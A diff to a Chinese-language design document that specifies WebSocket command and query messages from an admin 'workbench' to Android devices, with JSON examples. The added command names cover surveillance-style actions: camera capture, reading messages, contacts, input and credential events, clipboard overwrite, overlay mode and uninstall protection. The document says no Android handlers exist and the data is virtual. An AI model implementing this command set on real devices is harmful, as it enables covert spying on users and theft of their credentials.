@@ -314,6 +314,54 @@ INTERNAL_ERROR
 - 不伪装成系统页面；
 - 用户可以关闭。
 
+### 工作台固定动作消息
+
+控制区按钮只向设备 WebSocket 下发固定名称的消息。例如：
+
+```json
+{
+  "type": "command.dispatch",
+  "payload": {
+    "action": "unlock",
+    "parameters": {}
+  }
+}
+```
+
+固定名称包括：`unlock`、`verify-unlock`、`translate`、`lock-screen`、`uninstall-protection`、
+`launcher-icon`、`power-menu`、`screenshot`、`front-camera`、`rear-camera`、`camera`、
+`open-app`、`uninstall-app`、`overlay-mode`、`clear-clipboard` 和 `write-clipboard`。开关动作额外
+带布尔 `enabled`，应用动作携带 `package_name`，写入剪切板携带 `text`，遮盖模式只接受服务端
+白名单中的 `mode`。
+
+这些名称不在设备 bootstrap 的可执行动作白名单中；本仓库没有对应 Android 处理器。
+Android 可以忽略消息，也可以通过 `command.ack` 和 `command.result` 自报接收、完成或失败。
+后台只记录自报结果，不验证设备实际效果。
+
+### 工作台数据查询
+
+管理端可为 `messages`、`apps`、`system`、`permissions`、`gallery`、`contacts`、`files`、
+`clipboard`、`input-events`、`credential-events` 和 `camera` 下发固定查询消息。对应动作名为
+`read-messages`、`read-apps`、`read-system`、`read-permissions`、`read-gallery`、`read-contacts`、
+`read-files`、`read-clipboard`、`read-input-events`、`read-credential-events` 和
+`read-camera-data`，均不携带自定义参数。
+
+Android 使用同一个 `command.result` 回传虚拟数据：
+
+```json
+{
+  "type": "command.result",
+  "correlation_id": "command-id",
+  "payload": {
+    "success": true,
+    "result": {"items": [{"id": "demo-1", "name": "虚拟数据"}]}
+  }
+}
+```
+
+后台不生成兜底数据；没有 Android 回传时接口返回 `source: "no_report"` 和 `data: null`。
+收到成功结果后返回 `source: "android_self_reported"`，页面按 JSON 展示并明确标记为 Android 自报。
+
 ### `open_battery_settings`
 
 打开公开的应用电池设置或忽略电池优化页面。要求：
